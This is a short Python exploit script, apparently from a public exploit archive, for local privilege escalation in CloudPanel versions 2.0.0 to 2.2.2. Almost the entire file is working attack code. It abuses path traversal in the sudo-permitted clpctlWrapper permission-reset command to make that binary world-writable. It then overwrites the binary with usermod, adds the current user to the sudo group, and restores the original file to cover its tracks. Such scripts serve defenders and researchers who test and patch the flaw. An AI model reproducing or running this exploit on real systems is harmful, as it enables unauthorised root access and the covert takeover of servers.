# Exploit Author : EagleEye
# Github : https://github.com/EagleTube/
# Youtube : https://www.youtube.com/@EagleTube1337
# Title : Privilege Escalation through path traversal from file permission modification
# Version Affected : CloudPanel v2.0.0 - v2.2.2
# Vendor :  CloudPanel.io
# Date : 31/05/2023 , 12:00 PM

import os
import subprocess

def exec_command(command):
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()

def current_user():
    process = subprocess.Popen('whoami', stdout=subprocess.PIPE)
    return process.stdout.read().decode('utf-8')

def exploit():
    print('[-] AUTHOR : EAGLE EYE [-]')
    print('[+] Overriding file to writable')
    exec_command('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=../../../../../../../../usr/bin/clpctlWrapper')
    print('[+] Backup clpctlWrapper into tmp...')
    exec_command('cp /usr/bin/clpctlWrapper /tmp/clpctlWrapper')
    print('[+] Replacing clpctlWrapper with usermod...')
    exec_command('cp /usr/sbin/usermod /usr/bin/clpctlWrapper')
    print('[+] Gaining sudo privilege...')
    exec_command('sudo /usr/bin/clpctlWrapper -aG sudo '+current_user())
    print('[+] Moving original file')
    exec_command('cp /tmp/clpctlWrapper /usr/bin/clpctlWrapper')
    print('[!] Please relogin [!]')
    os.system('exit')

if __name__ == '__main__':
    exploit()
